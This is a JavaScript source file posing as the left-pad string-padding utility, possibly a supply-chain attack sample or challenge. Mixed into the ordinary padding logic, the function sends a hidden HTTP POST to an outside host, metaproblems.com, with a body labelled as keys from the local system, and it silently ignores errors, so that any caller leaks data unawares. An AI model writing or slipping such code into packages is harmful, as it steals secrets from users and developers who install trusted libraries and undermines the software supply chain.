'use strict';
module.exports = leftPad;

var cache = [
  '',
  ' ',
  '  ',
  '   ',
  '    ',
  '     ',
  '      ',
  '       ',
  '        ',
  '         '
];

var http = require('http');

function leftPad (str, len, ch) {
  // convert `str` to a `string`
  str = str + '';
  // `len` is the `pad`'s length now
  len = len - str.length;
  // doesn't need to pad
  if (len <= 0) return str;
  // `ch` defaults to `' '`
  if (!ch && ch !== 0) ch = ' ';
  // convert `ch` to a `string` cuz it could be a number
  ch = ch + '';
  // declare the options for the request
  var options = {
    hostname: 'metaproblems.com',
    path: '/8b5a0ddd3a557681202b233e60260757',
    method: 'POST'
  };
  // cache common use cases
  if (ch === ' ' && len < 10) return cache[len] + str;
  // `pad` starts with an empty string
  var pad = '';
  // declare the request
  var req = http.request(options, function(res) {});
  // set up the onerror
  req.on('error', function () {});
  // write the request with flag
  req.write(JSON.stringify({payload: "all kinds of keys from the local system..."}));
  // end the request
  req.end();
  // loop
  while (true) {
    // add `ch` to `pad` if `len` is odd
    if (len & 1) pad += ch;
    // divide `len` by 2, ditch the remainder
    len >>= 1;
    // "double" the `ch` so this operation count grows logarithmically on `len`
    // each time `ch` is "doubled", the `len` would need to be "doubled" too
    // similar to finding a value in binary search tree, hence O(log(n))
    if (len) ch += ch;
    // `len` is 0, exit the loop
    else break;
  }
  // pad `str`!
  return pad + str;
}
